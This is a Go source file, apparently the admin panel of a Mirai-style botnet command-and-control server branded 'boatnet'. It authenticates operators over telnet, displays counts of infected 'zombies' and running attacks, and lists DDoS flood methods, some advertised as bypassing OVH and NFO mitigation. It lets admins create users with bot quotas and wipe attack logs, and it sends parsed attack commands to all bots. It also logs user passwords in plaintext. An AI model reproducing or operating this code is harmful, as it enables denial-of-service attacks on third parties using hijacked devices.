package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "log"
    "os"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.Write([]byte(fmt.Sprintf("\033]0;Please enter your credentials.\007")))
    this.conn.SetDeadline(time.Now().Add(300 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[1;33mUsername \033[1;37m> \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(300 * time.Second))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[1;33mPassword \033[1;37m> \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(300 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'V', 'e', 'r', 'i', 'f', 'y', '.', '.', '.'}
    for i := 0; i < 15; i++ {
        this.conn.Write([]byte(fmt.Sprintf("\033]0;Waiting...\007")))
        this.conn.Write(append([]byte("\r\x1b[0;36m💫 \x1b[1;30m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(10) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))


    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;34mWrong credentials, try again.\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    if len(username) > 0 && len(password) > 0 {
        log.SetFlags(log.LstdFlags)
        loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
        if err != nil {
            fmt.Println("Error: ", err)
        }
        success := "successful login"
        usernameFormat := "username:"
        passwordFormat := "password:"
        ipFormat := "ip:"
        cmdSplit := "|"  
        log.SetOutput(loginLogsOutput)
        log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
    }

    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\r\x1b[1;37mWELCOME TO PLANET EDITION!!\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37mType ? to see all commands\r\n"))
    this.conn.Write([]byte("\r\n\033[0m"))
    
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if userInfo.admin == 1 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d zombies :: %d running atk :: %d sents :: %d users\007", BotCount, database.fetchRunningAttacks(), database.fetchAttacks(), database.fetchUsers()))); err != nil {
                    this.conn.Close()
                    break
                }
            }
            if userInfo.admin == 0 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d zombies :: %d running atk\007", BotCount, database.fetchRunningAttacks()))); err != nil {
                    this.conn.Close()
                    break
                }
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;37;47m \x1b[1;37m" + username + " \x1b[1;31m● boatnet \033[0m\x1b[1;37m ➤➤ "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
        if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[1;37m             \x1b[1;31m       .::.   \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m             \x1b[1;31m     .:'  .:  \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m        ,MMM8\x1b[1;31m&&&.:'   .:'  \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m       MMMMM88\x1b[1;31m&&&&  .:'    \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m      MMMMM88\x1b[1;31m&&&&&&:'      \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m      MMMMM88\x1b[1;31m&&&&&&        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m    .:MMMMM88\x1b[1;31m&&&&&&        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  .:'  MMMMM88\x1b[1;31m&&&&         \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m.:'   .:'MMM8\x1b[1;31m&&&'          \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m:'  .:'      \x1b[1;31m              \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m'::'         \x1b[1;31m              \r\n"))
    this.conn.Write([]byte("\r\n\033[0m"))
            continue
        }
        if cmd == "help" || cmd == "HELP" || cmd == "?"  || cmd == "methods" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("[38;5;196m┌──────────────────────────────────────────────────────────────────────────────┐\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m1        udp          UDP Flooding, DGRAM UDP with less PPS Speed             [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m2        handshake    stomp/handshake flood to bypass mitigation devices      [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m3        tcp          TCP flood (urg,ack,syn)                                 [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m4        std          STD flood (uid1 supported)                              [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m5        ack          ACK flood optimized for higher GBPS                     [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m6        syn          SYN flood optimized for higher GBPS                     [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m7        hex          HEX flood (using size=1400)                             [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m8        stdhex       STDHEX flood(bypasses ovh server)                       [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m9        nudp         NUDP flood(High PPS)                                    [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m10       udphex       UDPHEX flood                                            [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m11       xmas         XMAS RTCP Flag flood                                    [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m12       bypass       Strong TCP bypass                                       [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m│[38;5;231m13       raw          RAW UDP flood                                           [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m|[38;5;231m14       cudp         UDP flood with custom payload                           [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m|[38;5;231m15       ovhdrop      Drop ovh server                                         [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m|[38;5;231m16       nfo          Bypass nfo server                                       [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m|[38;5;231m18       ovhudp       OVH UDP Flood                                           [38;5;196m│\r\n"))
            this.conn.Write([]byte("[38;5;196m└──────────────────────────────────────────────────────────────────────────────┘\r\n"))
            continue
        }

         if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }

        if userInfo.admin == 1 && cmd == "xnxxhelp" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\x1b[1;37mxnxxuser      \x1b[1;33m-  \x1b[1;37mADD NEW NORMAL USER\r\n"))
            this.conn.Write([]byte("\x1b[1;37mxnxxadmin     \x1b[1;33m-  \x1b[1;37mADD NEW ADMIN\r\n"))
            this.conn.Write([]byte("\x1b[1;37mxnxxremove    \x1b[1;33m-  \x1b[1;37mREMOVE USER\r\n"))
            this.conn.Write([]byte("\x1b[1;37mxnxxlogs      \x1b[1;33m-  \x1b[1;37mREMOVE ATTACKS LOGS\r\n"))
            this.conn.Write([]byte("\x1b[1;37mcount         \x1b[1;33m-  \x1b[1;37mSHOW ALL BOTS\r\n"))
            continue
        }

        if len(cmd) > 0 {
            log.SetFlags(log.LstdFlags)
            output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
            if err != nil {
                fmt.Println("Error: ", err)
            }
            usernameFormat := "username:"
            cmdFormat := "command:"
            ipFormat := "ip:"
            cmdSplit := "|" 
            log.SetOutput(output)
            log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
        }
        
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "xnxxadmin" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("-1 for Full Bots.\r\n"))
            this.conn.Write([]byte("Allowed Bots: "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for Max attack duration. \r\n"))
            this.conn.Write([]byte("Allowed Duration: "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for no cooldown. \r\n"))
            this.conn.Write([]byte("Cooldown: "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("Username: " + new_un + "\r\n"))
            this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
            this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
            this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
            this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
            this.conn.Write([]byte(""))
            this.conn.Write([]byte("Confirm(y): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte("Failed to create Admin! \r\n"))
            } else {
                this.conn.Write([]byte("Admin created! \r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "xnxxlogs"  {
            this.conn.Write([]byte("\033[1;91mClear attack logs\033[1;33m?(y/n): \033[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CleanLogs() {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
            } else {
                this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
                fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + username + " \033[1;91m!\r\n")
            }
            continue 
        }
        
        if userInfo.admin == 1 && cmd == "xnxxremove" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if !database.removeUser(new_un) {
                this.conn.Write([]byte("User doesn't exists.\r\n"))
            } else {
                this.conn.Write([]byte("User removed\r\n"))
            }
            continue
        }
        
        if userInfo.admin == 1 && cmd == "xnxxuser" {
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter New Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Choose New Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter Bot Count (-1 For Full Bots): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Max Attack Duration (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m User Added Successfully.\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "count" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37m%s: \x1b[1;31m%d\033[0m\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mTotal botcount: \x1b[1;31m%d\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mAttack sent to all bots\r\n")))
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
